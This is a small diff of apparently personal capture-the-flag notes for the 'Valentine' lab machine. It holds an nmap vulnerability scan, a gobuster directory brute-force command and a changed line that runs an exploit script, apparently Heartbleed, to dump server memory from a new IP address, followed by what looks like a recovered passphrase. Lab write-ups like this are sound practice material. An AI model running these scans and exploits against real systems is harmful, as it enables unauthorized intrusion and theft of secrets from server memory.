@@ -3,7 +3,7 @@ nmap --script vuln -sV -p 22,80,443 10.129.100.237 > nmapvuln.txt
 gobuster dir  -k -u https://valentine.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,py,cgi > gobusterhttps.txt
 
 
-python2.7 exploit.py -n100 -f dump.bin  valentine.htb
+python2.7 exploit.py -n500 -f dump.bin 10.11.1.237
 
 
 heartbleedbelievethehype
